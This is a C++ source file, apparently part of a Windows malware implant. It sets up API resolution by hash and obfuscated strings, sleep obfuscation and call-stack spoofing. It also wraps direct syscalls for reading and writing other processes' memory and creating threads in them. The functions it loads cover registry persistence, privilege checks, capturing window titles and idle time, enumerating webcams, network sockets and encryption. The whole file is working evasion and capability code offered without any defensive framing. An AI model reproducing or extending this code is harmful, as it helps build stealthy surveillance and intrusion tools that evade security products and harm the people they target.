#include "Internal.h"
#include "Obfuscation.h"
#include "SleepObf.h"
#include "StackSpoof.h"
#include "../../DebugLog.h"
namespace Internal {
    Resolver::LoadLibraryA_t _LoadLibraryA = nullptr;
    Resolver::GetProcAddress_t _GetProcAddress = nullptr;
    Resolver::MultiByteToWideChar_t _MultiByteToWideChar = nullptr;
    Resolver::GetSystemInfo_t _GetSystemInfo = nullptr;
    Resolver::VirtualProtect_t _VirtualProtect = nullptr;
    Resolver::VirtualAlloc_t _VirtualAlloc = nullptr;
    Resolver::VirtualFree_t _VirtualFree = nullptr;
    Resolver::GetModuleHandleA_t _GetModuleHandleA = nullptr;
    Resolver::GetComputerNameA_t _GetComputerNameA = nullptr;
    Resolver::GetSystemDirectoryA_t _GetSystemDirectoryA = nullptr;
    Resolver::GetDiskFreeSpaceExA_t _GetDiskFreeSpaceExA = nullptr;
    Resolver::GlobalMemoryStatusEx_t _GlobalMemoryStatusEx = nullptr;
    Resolver::GetCurrentProcessId_t _GetCurrentProcessId = nullptr;
    Resolver::GetCurrentThreadId_t _GetCurrentThreadId = nullptr;
    Resolver::SetProcessWorkingSetSize_t _SetProcessWorkingSetSize = nullptr;
    Resolver::SetThreadExecutionState_t _SetThreadExecutionState = nullptr;
    Resolver::GetTickCount_t _GetTickCount = nullptr;
    Resolver::CreateMutexA_t _CreateMutexA = nullptr;
    Resolver::GetLastError_t _GetLastError = nullptr;
    Resolver::GetModuleFileNameA_t _GetModuleFileNameA = nullptr;
    Resolver::FileTimeToSystemTime_t _FileTimeToSystemTime = nullptr;
    Resolver::CreateFileA_t _CreateFileA = nullptr;
    Resolver::GetFileTime_t _GetFileTime = nullptr;
    Resolver::CloseHandle_t _CloseHandle = nullptr;
    Resolver::GetProcessHeap_t _GetProcessHeap = nullptr;
    Resolver::HeapAlloc_t _HeapAlloc = nullptr;
    Resolver::HeapFree_t _HeapFree = nullptr;
    Resolver::CreateFileMappingA_t _CreateFileMappingA = nullptr;
    Resolver::MapViewOfFile_t _MapViewOfFile = nullptr;
    Resolver::UnmapViewOfFile_t _UnmapViewOfFile = nullptr;
    Resolver::GetUserNameA_t _GetUserNameA = nullptr;
    Resolver::RegCreateKeyExA_t _RegCreateKeyExA = nullptr;
    Resolver::RegSetValueExA_t _RegSetValueExA = nullptr;
    Resolver::RegOpenKeyExA_t _RegOpenKeyExA = nullptr;
    Resolver::RegQueryValueExA_t _RegQueryValueExA = nullptr;
    Resolver::RegCloseKey_t _RegCloseKey = nullptr;
    Resolver::OpenProcessToken_t _OpenProcessToken = nullptr;
    Resolver::GetTokenInformation_t _GetTokenInformation = nullptr;
    Resolver::GetForegroundWindow_t _GetForegroundWindow = nullptr;
    Resolver::GetWindowTextA_t _GetWindowTextA = nullptr;
    Resolver::GetLastInputInfo_t _GetLastInputInfo = nullptr;
    Resolver::EnumDisplayDevicesA_t _EnumDisplayDevicesA = nullptr;
    Resolver::WSAStartup_t _WSAStartup = nullptr;
    Resolver::WSACleanup_t _WSACleanup = nullptr;
    Resolver::socket_t _socket = nullptr;
    Resolver::connect_t _connect = nullptr;
    Resolver::send_t _send = nullptr;
    Resolver::recv_t _recv = nullptr;
    Resolver::closesocket_t _closesocket = nullptr;
    Resolver::getaddrinfo_t _getaddrinfo = nullptr;
    Resolver::freeaddrinfo_t _freeaddrinfo = nullptr;
    Resolver::setsockopt_t _setsockopt = nullptr;
    Resolver::InternetOpenA_t _InternetOpenA = nullptr;
    Resolver::InternetOpenUrlA_t _InternetOpenUrlA = nullptr;
    Resolver::InternetReadFile_t _InternetReadFile = nullptr;
    Resolver::InternetCloseHandle_t _InternetCloseHandle = nullptr;
    Resolver::CryptStringToBinaryA_t _CryptStringToBinaryA = nullptr;
    Resolver::BCryptOpenAlgorithmProvider_t _BCryptOpenAlgorithmProvider = nullptr;
    Resolver::BCryptGetProperty_t _BCryptGetProperty = nullptr;
    Resolver::BCryptCreateHash_t _BCryptCreateHash = nullptr;
    Resolver::BCryptHashData_t _BCryptHashData = nullptr;
    Resolver::BCryptFinishHash_t _BCryptFinishHash = nullptr;
    Resolver::BCryptDestroyHash_t _BCryptDestroyHash = nullptr;
    Resolver::BCryptCloseAlgorithmProvider_t _BCryptCloseAlgorithmProvider = nullptr;
    Resolver::BCryptGenRandom_t _BCryptGenRandom = nullptr;
    Resolver::BCryptSetProperty_t _BCryptSetProperty = nullptr;
    Resolver::BCryptGenerateSymmetricKey_t _BCryptGenerateSymmetricKey = nullptr;
    Resolver::BCryptEncrypt_t _BCryptEncrypt = nullptr;
    Resolver::BCryptDecrypt_t _BCryptDecrypt = nullptr;
    Resolver::BCryptDestroyKey_t _BCryptDestroyKey = nullptr;
    Resolver::CoInitializeEx_t _CoInitializeEx = nullptr;
    Resolver::CoInitializeSecurity_t _CoInitializeSecurity = nullptr;
    Resolver::CoCreateInstance_t _CoCreateInstance = nullptr;
    Resolver::CoUninitialize_t _CoUninitialize = nullptr;
    Resolver::VariantClear_t _VariantClear = nullptr;
    Resolver::capGetDriverDescriptionA_t _capGetDriverDescriptionA = nullptr;
    Resolver::IsUserAnAdmin_t _IsUserAnAdmin = nullptr;
    static LPVOID ResolveKernelAPI(DWORD funcHash) {
        LPVOID addr = Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, funcHash);
        if (!addr) addr = Resolver::GetAPIByHash(Resolver::HASH_KERNELBASE, funcHash);
        return addr;
    }
    static LPVOID ResolveViaGPA(const char* dllName, const char* funcName) {
        if (!_GetModuleHandleA || !_GetProcAddress) return NULL;
        HMODULE hMod = _GetModuleHandleA(dllName);
        if (!hMod && _LoadLibraryA) hMod = _LoadLibraryA(dllName);
        if (!hMod) return NULL;
        return (LPVOID)_GetProcAddress(hMod, funcName);
    }
    bool Initialize() {
        SLOG("[INTERNAL] Initialize() started");
        Resolver::InitRuntimeKeys();
        SLOG("[INTERNAL] InitRuntimeKeys OK");
        _LoadLibraryA = (Resolver::LoadLibraryA_t)ResolveKernelAPI(Resolver::HASH_LOADLIBRARYA);
        if (!_LoadLibraryA) { SLOG("[INTERNAL] LoadLibraryA resolve FAILED"); return false; }
        SLOG("[INTERNAL] LoadLibraryA resolved OK");
        _LoadLibraryA(OBFS_S("advapi32.dll").c_str());
        _LoadLibraryA(OBFS_S("user32.dll").c_str());
        _LoadLibraryA(OBFS_S("ws2_32.dll").c_str());
        _LoadLibraryA(OBFS_S("wininet.dll").c_str());
        _LoadLibraryA(OBFS_S("crypt32.dll").c_str());
        _LoadLibraryA(OBFS_S("bcrypt.dll").c_str());
        _LoadLibraryA(OBFS_S("ole32.dll").c_str());
        _LoadLibraryA(OBFS_S("oleaut32.dll").c_str());
        _LoadLibraryA(OBFS_S("vfw32.dll").c_str());
        _LoadLibraryA(OBFS_S("shell32.dll").c_str());
        _GetProcAddress = (Resolver::GetProcAddress_t)ResolveKernelAPI(Resolver::HASH_GETPROCADDRESS);
        _MultiByteToWideChar = (Resolver::MultiByteToWideChar_t)ResolveKernelAPI(Resolver::HASH_MULTIBYTETOWIDECHAR);
        _GetSystemInfo = (Resolver::GetSystemInfo_t)ResolveKernelAPI(Resolver::HASH_GETSYSTEMINFO);
        _VirtualProtect = (Resolver::VirtualProtect_t)ResolveKernelAPI(Resolver::HASH_VIRTUALPROTECT);
        _VirtualAlloc = (Resolver::VirtualAlloc_t)ResolveKernelAPI(Resolver::HASH_VIRTUALALLOC);
        _VirtualFree = (Resolver::VirtualFree_t)ResolveKernelAPI(Resolver::HASH_VIRTUALFREE);
        _GetModuleHandleA = (Resolver::GetModuleHandleA_t)ResolveKernelAPI(Resolver::HASH_GETMODULEHANDLEA);
        if (!_GetProcAddress || !_GetModuleHandleA || !_VirtualAlloc) {
            SLOG("[INTERNAL] Critical API resolve FAILED (GPA=%p GMH=%p VA=%p)", _GetProcAddress, _GetModuleHandleA, _VirtualAlloc);
            return false;
        }
        SLOG("[INTERNAL] Core APIs resolved OK");
        _GetComputerNameA = (Resolver::GetComputerNameA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetComputerNameA").c_str()); 
        _GetSystemDirectoryA = (Resolver::GetSystemDirectoryA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetSystemDirectoryA").c_str()); 
        _GetDiskFreeSpaceExA = (Resolver::GetDiskFreeSpaceExA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetDiskFreeSpaceExA").c_str()); 
        _GlobalMemoryStatusEx = (Resolver::GlobalMemoryStatusEx_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GlobalMemoryStatusEx").c_str()); 
        _GetCurrentProcessId = (Resolver::GetCurrentProcessId_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetCurrentProcessId").c_str()); 
        _GetCurrentThreadId = (Resolver::GetCurrentThreadId_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetCurrentThreadId").c_str()); 
        _SetProcessWorkingSetSize = (Resolver::SetProcessWorkingSetSize_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("SetProcessWorkingSetSize").c_str()); 
        _SetThreadExecutionState = (Resolver::SetThreadExecutionState_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("SetThreadExecutionState").c_str()); 
        _GetTickCount = (Resolver::GetTickCount_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetTickCount").c_str()); 
        _CreateMutexA = (Resolver::CreateMutexA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CreateMutexA").c_str()); 
        _GetLastError = (Resolver::GetLastError_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetLastError").c_str()); 
        _GetModuleFileNameA = (Resolver::GetModuleFileNameA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetModuleFileNameA").c_str()); 
        _FileTimeToSystemTime = (Resolver::FileTimeToSystemTime_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("FileTimeToSystemTime").c_str()); 
        _CreateFileA = (Resolver::CreateFileA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CreateFileA").c_str()); 
        _GetFileTime = (Resolver::GetFileTime_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetFileTime").c_str()); 
        _CloseHandle = (Resolver::CloseHandle_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CloseHandle").c_str()); 
        _GetProcessHeap = (Resolver::GetProcessHeap_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetProcessHeap").c_str()); 
        _HeapAlloc = (Resolver::HeapAlloc_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("HeapAlloc").c_str()); 
        _HeapFree = (Resolver::HeapFree_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("HeapFree").c_str()); 
        _CreateFileMappingA = (Resolver::CreateFileMappingA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CreateFileMappingA").c_str()); 
        _MapViewOfFile = (Resolver::MapViewOfFile_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("MapViewOfFile").c_str()); 
        _UnmapViewOfFile = (Resolver::UnmapViewOfFile_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("UnmapViewOfFile").c_str());
        _GetUserNameA = (Resolver::GetUserNameA_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("GetUserNameA").c_str());
        _RegCreateKeyExA = (Resolver::RegCreateKeyExA_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegCreateKeyExA").c_str());
        _RegSetValueExA = (Resolver::RegSetValueExA_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegSetValueExA").c_str());
        _RegOpenKeyExA = (Resolver::RegOpenKeyExA_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegOpenKeyExA").c_str());
        _RegQueryValueExA = (Resolver::RegQueryValueExA_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegQueryValueExA").c_str());
        _RegCloseKey = (Resolver::RegCloseKey_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegCloseKey").c_str());
        _OpenProcessToken = (Resolver::OpenProcessToken_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("OpenProcessToken").c_str());
        _GetTokenInformation = (Resolver::GetTokenInformation_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("GetTokenInformation").c_str());
        _GetForegroundWindow = (Resolver::GetForegroundWindow_t)ResolveViaGPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetForegroundWindow").c_str());
        _GetWindowTextA = (Resolver::GetWindowTextA_t)ResolveViaGPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetWindowTextA").c_str());
        _GetLastInputInfo = (Resolver::GetLastInputInfo_t)ResolveViaGPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetLastInputInfo").c_str());
        _EnumDisplayDevicesA = (Resolver::EnumDisplayDevicesA_t)ResolveViaGPA(OBFS_S("user32.dll").c_str(), OBFS_S("EnumDisplayDevicesA").c_str());
        _WSAStartup = (Resolver::WSAStartup_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("WSAStartup").c_str());
        _WSACleanup = (Resolver::WSACleanup_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("WSACleanup").c_str());
        _socket = (Resolver::socket_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("socket").c_str());
        _connect = (Resolver::connect_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("connect").c_str());
        _send = (Resolver::send_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("send").c_str());
        _recv = (Resolver::recv_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("recv").c_str());
        _closesocket = (Resolver::closesocket_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("closesocket").c_str());
        _getaddrinfo = (Resolver::getaddrinfo_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("getaddrinfo").c_str());
        _freeaddrinfo = (Resolver::freeaddrinfo_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("freeaddrinfo").c_str());
        _setsockopt = (Resolver::setsockopt_t)ResolveViaGPA(OBFS_S("ws2_32.dll").c_str(), OBFS_S("setsockopt").c_str());
        _InternetOpenA = (Resolver::InternetOpenA_t)ResolveViaGPA(OBFS_S("wininet.dll").c_str(), OBFS_S("InternetOpenA").c_str());
        _InternetOpenUrlA = (Resolver::InternetOpenUrlA_t)ResolveViaGPA(OBFS_S("wininet.dll").c_str(), OBFS_S("InternetOpenUrlA").c_str());
        _InternetReadFile = (Resolver::InternetReadFile_t)ResolveViaGPA(OBFS_S("wininet.dll").c_str(), OBFS_S("InternetReadFile").c_str());
        _InternetCloseHandle = (Resolver::InternetCloseHandle_t)ResolveViaGPA(OBFS_S("wininet.dll").c_str(), OBFS_S("InternetCloseHandle").c_str());
        _CryptStringToBinaryA = (Resolver::CryptStringToBinaryA_t)ResolveViaGPA(OBFS_S("crypt32.dll").c_str(), OBFS_S("CryptStringToBinaryA").c_str());
        _BCryptOpenAlgorithmProvider = (Resolver::BCryptOpenAlgorithmProvider_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptOpenAlgorithmProvider").c_str());
        _BCryptGetProperty = (Resolver::BCryptGetProperty_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptGetProperty").c_str());
        _BCryptCreateHash = (Resolver::BCryptCreateHash_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptCreateHash").c_str());
        _BCryptHashData = (Resolver::BCryptHashData_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptHashData").c_str());
        _BCryptFinishHash = (Resolver::BCryptFinishHash_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptFinishHash").c_str());
        _BCryptDestroyHash = (Resolver::BCryptDestroyHash_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptDestroyHash").c_str());
        _BCryptCloseAlgorithmProvider = (Resolver::BCryptCloseAlgorithmProvider_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptCloseAlgorithmProvider").c_str());
        _BCryptGenRandom = (Resolver::BCryptGenRandom_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptGenRandom").c_str());
        _BCryptSetProperty = (Resolver::BCryptSetProperty_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptSetProperty").c_str());
        _BCryptGenerateSymmetricKey = (Resolver::BCryptGenerateSymmetricKey_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptGenerateSymmetricKey").c_str());
        _BCryptEncrypt = (Resolver::BCryptEncrypt_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptEncrypt").c_str());
        _BCryptDecrypt = (Resolver::BCryptDecrypt_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptDecrypt").c_str());
        _BCryptDestroyKey = (Resolver::BCryptDestroyKey_t)ResolveViaGPA(OBFS_S("bcrypt.dll").c_str(), OBFS_S("BCryptDestroyKey").c_str());
        _CoInitializeEx = (Resolver::CoInitializeEx_t)ResolveViaGPA(OBFS_S("ole32.dll").c_str(), OBFS_S("CoInitializeEx").c_str());
        _CoInitializeSecurity = (Resolver::CoInitializeSecurity_t)ResolveViaGPA(OBFS_S("ole32.dll").c_str(), OBFS_S("CoInitializeSecurity").c_str());
        _CoCreateInstance = (Resolver::CoCreateInstance_t)ResolveViaGPA(OBFS_S("ole32.dll").c_str(), OBFS_S("CoCreateInstance").c_str());
        _CoUninitialize = (Resolver::CoUninitialize_t)ResolveViaGPA(OBFS_S("ole32.dll").c_str(), OBFS_S("CoUninitialize").c_str());
        _VariantClear = (Resolver::VariantClear_t)ResolveViaGPA(OBFS_S("oleaut32.dll").c_str(), OBFS_S("VariantClear").c_str());
        _capGetDriverDescriptionA = (Resolver::capGetDriverDescriptionA_t)ResolveViaGPA(OBFS_S("vfw32.dll").c_str(), OBFS_S("capGetDriverDescriptionA").c_str());
        _IsUserAnAdmin = (Resolver::IsUserAnAdmin_t)ResolveViaGPA(OBFS_S("shell32.dll").c_str(), OBFS_S("IsUserAnAdmin").c_str());
        SLOG("[INTERNAL] All API pointers resolved, initializing stealth subsystems...");
        SLOG("[INTERNAL] Calling SleepObf::Init()...");
        bool sleepOk = SleepObf::Init();
        SLOG("[INTERNAL] SleepObf::Init() = %s", sleepOk ? "OK" : "FAILED (non-fatal)");
        SLOG("[INTERNAL] Calling StackSpoof::Init()...");
        bool spoofOk = StackSpoof::Init();
        SLOG("[INTERNAL] StackSpoof::Init() = %s", spoofOk ? "OK" : "FAILED (non-fatal)");
        SLOG("[INTERNAL] Initialize() completed OK");
        return true;
    }
    NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
    {
        return Syscalls::NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
    }
    NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)
    {
        return Syscalls::NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
    }
    NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
        PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
    {
        return Syscalls::NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
    }
    NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        PSIZE_T RegionSize, ULONG FreeType)
    {
        return Syscalls::NtFreeVirtualMemory(ProcessHandle, BaseAddress, RegionSize, FreeType);
    }
    NTSTATUS NtClose(HANDLE Handle) {
        return Syscalls::NtClose(Handle);
    }
    NTSTATUS NtQueryInformationProcess(HANDLE ProcessHandle,
        ULONG ProcessInformationClass, PVOID ProcessInformation,
        ULONG ProcessInformationLength, PULONG ReturnLength)
    {
        return Syscalls::NtQueryInformationProcess(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
    }
    NTSTATUS NtSetInformationThread(HANDLE ThreadHandle,
        ULONG ThreadInformationClass, PVOID ThreadInformation,
        ULONG ThreadInformationLength)
    {
        return Syscalls::NtSetInformationThread(ThreadHandle, ThreadInformationClass, ThreadInformation, ThreadInformationLength);
    }
    NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine,
        PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits,
        SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList)
    {
        return Syscalls::NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
    }
    NTSTATUS NtDelayExecution(BOOLEAN Alertable, LONGLONG* DelayInterval) {
        return Syscalls::NtDelayExecution(Alertable, DelayInterval);
    }
    NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
        PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead)
    {
        return Syscalls::NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead);
    }
    NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes, PVOID ClientId)
    {
        return Syscalls::NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
    }
    NTSTATUS NtQuerySystemInformation(ULONG SystemInformationClass,
        PVOID SystemInformation, ULONG SystemInformationLength,
        PULONG ReturnLength)
    {
        return Syscalls::NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    }
    NTSTATUS NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable,
        PLARGE_INTEGER Timeout)
    {
        return Syscalls::NtWaitForSingleObject(Handle, Alertable, Timeout);
    }
    void SleepMs(DWORD milliseconds) {
        Syscalls::SleepMs(milliseconds);
    }
}
